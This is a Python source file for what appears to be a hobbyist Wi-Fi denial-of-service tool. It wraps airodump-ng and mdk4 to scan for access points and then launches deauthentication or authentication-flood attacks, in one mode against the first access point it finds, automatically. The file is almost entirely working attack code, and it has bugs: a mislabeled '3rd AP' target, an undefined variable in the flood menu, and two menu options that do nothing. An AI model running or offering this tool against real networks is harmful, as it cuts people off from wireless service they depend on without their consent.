import re
import subprocess
import time
import csv
from pathlib import Path
from tabulate import tabulate


def start_menu():
    print("1) Deauthentication \n"
          "2) Beacon Flood\n"
          "3) Authentication Flood\n"
          "4) Probe Request/Response Flood"
          )
    menu = input("Action: ")
    if menu == "1":
        print("\nDEAUTHENTICATION selected")
        print("Scan for targets or enter manually?")
        print("\n1) Scan for targets" 
              "\n2) Enter target information manually")
        action = input("Action: ")
        deauth_menu(action)
    if menu == "3":
        print("\nAUTHENTICATION FLOOD selected")
        print("Scan for target access points or enter manually?")
        print("\n1) Scan for targets" 
              "\n2) Enter target information manually")
        action = input("Action: ")
        auth_flood_menu(action)
    return menu

def header():
    GREEN = "\033[92m"  # Bright Green
    RESET = "\033[0m"  # Reset to default

    print(GREEN + r"""
    $$\      $$\       $$\ $$\       $$\   $$\       $$$$$$$\                      
    $$$\    $$$ |      $$ |$$ |      $$ |  $$ |      $$  __$$\                     
    $$$$\  $$$$ | $$$$$$$ |$$ |  $$\ $$ |  $$ |      $$ |  $$ | $$$$$$\   $$$$$$$\ 
    $$\$$\$$ $$ |$$  __$$ |$$ | $$  |$$$$$$$$ |      $$ |  $$ |$$  __$$\ $$  _____|
    $$ \$$$  $$ |$$ /  $$ |$$$$$$  / \_____$$ |      $$ |  $$ |$$ /  $$ |\$$$$$$\  
    $$ |\$  /$$ |$$ |  $$ |$$  _$$<        $$ |      $$ |  $$ |$$ |  $$ | \____$$\ 
    $$ | \_/ $$ |\$$$$$$$ |$$ | \$$\       $$ |      $$$$$$$  |\$$$$$$  |$$$$$$$  |
    \__|     \__| \_______|\__|  \__|      \__|      \_______/  \______/ \_______/ 
    """ + RESET)

def list_interfaces():
    result = subprocess.check_output(["iw", "dev"], encoding="utf-8")
    interfaces = re.findall(r'Interface\s+(\w+)', result)
    return interfaces
def deauth_menu(action):

   

    interfaces = list_interfaces()
    i = 1
    for interface in interfaces:
        print(str(i) + ") " + interface)
        i = i + 1

    try:
        if not interfaces:
            print("[!] No wireless capable interfaces detected")
            print("Please connect a wireless adapter")
            result = -1
        else:
            selected_int = input("\nSelect WLAN interface: ")

            if action == "1":
                output_file = "capture"

                run_airodump(output_file, interfaces[int(selected_int) - 1], 20)

                files = sorted(Path(".").glob(f"{output_file}-*.csv"), key=lambda f: f.stat().st_mtime)
                if not files:
                    print("[!] No CSV file found.")
                else:
                    latest_csv = files[-1]

                    # Always rename to capture.csv (overwrite old one)
                    final_csv = Path(f"{output_file}.csv")
                    latest_csv.rename(final_csv)

                    print(f"[+] Using results from {final_csv}")
                    display_tables(final_csv)

                    # Get APs and print the MAC of the 3rd AP
                    aps_lines, _ = split_airodump_csv(final_csv)
                    aps = parse_block(aps_lines)
                    if len(aps) >= 3:
                        print(f"[+] MAC of 3rd AP: {aps[0]['BSSID']}")
                        mac = aps[0]['BSSID']
                        channel = aps[0]['channel']
                        result = deauth(mac, channel, interfaces[int(selected_int) - 1])
                    else:
                        print(f"[!] Only {len(aps)} AP(s) found.")
                        result = -1

                print("YLE!")
            if action == "2":
                mac = input("Enter BSSID/MAC: ")
                channel = input("Enter channel: ")
                result = deauth(mac, channel, interfaces[int(selected_int) - 1])

        if result == -1:
            print("\n[!] Process interrupted. Returning to main menu.")
            header()
            start_menu()
            return

    except ValueError:
        print("[!] Please enter a numeric value!")
        start_menu()
        return

def auth_flood_menu(action):

    if action == "2":

        interfaces = list_interfaces()
        i = 1
        for interface in interfaces:
            print(str(i) + ") " + interface)
            i = i +1

    try:
        if not interfaces:
            print("[!] No wireless capable interfaces detected")
            print("Please connect a wireless adapter")
            result = -1
        else:
            selected_int = input("\nSelect WLAN interface: ")
            bssid = input("Enter BSSID: ")
            result = auth_flood(bssid, interfaces[int(selected_int) - 1])

        if result == -1:
            print("\n[!] Process interrupted. Returning to main menu.")
            header()
            start_menu()
            return
    except ValueError:
        print("[!] Please enter a numeric value!")
        start_menu()
        return
def deauth(mac, channel, interface):
    cmd = ["sudo", "mdk4", interface, "d", "-B", mac, "-c", channel]
    print(f"Running: {' '.join(cmd)}\n")
    exit_code = run_command_live(cmd)
    print(f"\nProcess finished with exit code {exit_code}")

def auth_flood(bssid, interface):
    cmd = ["sudo", "mdk4", interface, "a", "-a", bssid]
    print(f"Running: {' '.join(cmd)}\n")
    exit_code = run_command_live(cmd)
    print(f"\nProcess finished with exit code {exit_code}")
def run_command_live(command):
    try:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )

        for line in process.stdout:
            print(line, end="")

        process.stdout.close()
        process.wait()
        return process.returncode
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Terminating...")
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
        return -1  # custom exit code for interrupt

#DEAUTH SECTION!!
def run_airodump(output_file, interface, duration):
    """Run airodump-ng for given duration and stop."""
    try:
        process = subprocess.Popen(
            ["airodump-ng", "-w", output_file, "--output-format", "csv", interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"[+] Airodump started, capturing for {duration} seconds...")
        time.sleep(duration)

    except KeyboardInterrupt:
        print("[!] Interrupted by user.")

    finally:
        print("[*] Stopping airodump...")
        process.terminate()
        process.wait()


def split_airodump_csv(filepath):
    """Split an airodump CSV into APs and Clients blocks."""
    lines = Path(filepath).read_text(encoding="utf-8", errors="ignore").splitlines()
    idx = next(i for i, ln in enumerate(lines) if ln.startswith("Station MAC"))

    aps_lines = [ln for ln in lines[:idx] if ln.strip()]
    clients_lines = [ln for ln in lines[idx:] if ln.strip()]
    return aps_lines, clients_lines


def parse_block(block_lines):
    """Turn one block into a list of dicts."""
    reader = csv.DictReader(block_lines, skipinitialspace=True)
    return list(reader)


def display_tables(csv_file):
    """Parse and print APs and Clients from CSV."""
    aps_lines, clients_lines = split_airodump_csv(csv_file)

    aps = parse_block(aps_lines)
    clients = parse_block(clients_lines)

    print("\n=== Access Points ===")
    if aps:
        aps_enum = [{"#": i+1, **row} for i, row in enumerate(aps)]
        print(tabulate(aps_enum, headers="keys", tablefmt="psql"))
    else:
        print("No APs captured.")

    print("\n=== Clients ===")
    if clients:
        clients_enum = [{"#": i+1, **row} for i, row in enumerate(clients)]
        print(tabulate(clients_enum, headers="keys", tablefmt="psql"))
    else:
        print("No Clients captured.")

def main():
    while True:
        try:
            header()
            start_menu()
        except KeyboardInterrupt:
            print("\n[!] Exiting program.")
            break

if __name__=="__main__":

    main()

